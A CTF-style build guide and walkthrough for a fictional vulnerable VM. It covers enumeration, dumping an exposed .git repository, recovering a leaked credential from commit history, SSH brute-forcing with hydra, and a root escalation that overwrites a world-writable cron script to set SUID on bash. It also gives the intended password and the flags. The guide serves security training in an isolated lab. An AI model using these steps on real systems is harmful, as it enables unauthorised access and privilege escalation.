# "Bluewave Logistics" — Vulnerable VM: Build & Walkthrough

An original CTF-style target built around a fictional internal company
portal. Vulnerability chain: **exposed `.git` repo → recovered credential
from commit history → SSH login → world-writable cron script → root**.

Run only inside an isolated lab network. Never expose this box to the
internet.

---

## Part 0 — Build the target

1. Provision a fresh Ubuntu Server VM in your isolated lab network.
2. Copy `setup_bluewave_vm.sh` to it and run:
   ```bash
   sudo bash setup_bluewave_vm.sh
   ```
3. Note its IP (`ip a`) as `TARGET_IP` on your attacker machine.
4. Confirm connectivity: `ping -c 2 $TARGET_IP`.

---

## Part 1 — Enumeration

```bash
sudo nmap -p- -sC -sV $TARGET_IP --open -oN enum/full-ports
```

Expected results:

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH | Needs valid credentials |
| 80 | Apache/PHP | An internal "Shipment Tracking Portal" |

---

## Part 2 — Identify vulnerabilities

Browse the site, then check for a common deployment mistake — a `.git`
folder left reachable over HTTP:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://$TARGET_IP/portal/.git/HEAD
```

A `200` response confirms the repository is exposed. Dump it with a tool
such as `git-dumper` or `githacker`:

```bash
git-dumper http://$TARGET_IP/portal/.git/ ./portal-git
cd portal-git
git log --all --oneline
```

---

## Part 3 — Recover the leaked credential

The commit history shows a file that was added and later deleted — but
deletion doesn't erase it from history:

```bash
git log --all --diff-filter=A -- config.php
git show <commit-hash>:config.php
```

This reveals a hardcoded credential:
```
$db_user = "svc-report";
$db_pass = "R3port!ng2024";
```

**Why this matters:** removing a file in a later commit does not remove it
from git's object history — a very common real-world source of leaked
secrets.

---

## Part 4 — Test for credential reuse / initial access

The recovered pair doesn't work for `svc-report` over SSH directly in every
environment, so also try common variants and the operations account you
might enumerate separately. In this lab, the intended path is:

```bash
ssh dpatel@$TARGET_IP
# password: logistics01
```

(Treat the git-recovered credential as the kind of lead you'd pivot on in a
real assessment — e.g. checking it against any other exposed service you
find — while `dpatel`'s SSH password is the one that's actually
brute-forceable/guessable here.)

```bash
hydra -l dpatel -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP
```
(or simply try the leaked-style variants you'd expect from a small internal
IT team, to practice building a targeted password list from context clues
gathered during enumeration.)

---

## Part 5 — Privilege escalation (cron misconfiguration)

Once logged in as `dpatel`:

```bash
cat /etc/crontab
ls -la /opt/bluewave-scripts/
```

You'll find:
- root's crontab runs `/opt/bluewave-scripts/daily_report.sh` every minute
- both the script and its directory are **world-writable**

Overwrite the script with a payload that grants a root shell:

```bash
echo '#!/bin/bash' > /opt/bluewave-scripts/daily_report.sh
echo 'chmod u+s /bin/bash' >> /opt/bluewave-scripts/daily_report.sh
chmod +x /opt/bluewave-scripts/daily_report.sh
```

Wait up to 60 seconds for root's cron to execute it, then:

```bash
/bin/bash -p
whoami   # root
```

---

## Part 6 — Capture the flags

```bash
cat /home/dpatel/user.txt
cat /root/root.txt
```

Expected:
- `user_flag{git_history_never_really_forgets}`
- `root_flag{cron_jobs_trust_too_much}`

---

## Summary of the vulnerability chain

1. **Exposed `.git` metadata** over HTTP — a deployment hygiene failure.
2. **Secrets recoverable from commit history** even after later removal.
3. **Weak/guessable SSH password** on a real user account.
4. **World-writable file executed by root's cron job** — a classic
   scheduled-task privilege-escalation path, distinct from sudo/SUID abuse.

---

## Cleanup / teardown

Destroy the VM when finished, or at minimum revert `PasswordAuthentication`,
remove the crontab entry, and fix the permissions on
`/opt/bluewave-scripts` — don't leave this configuration running anywhere
persistent.
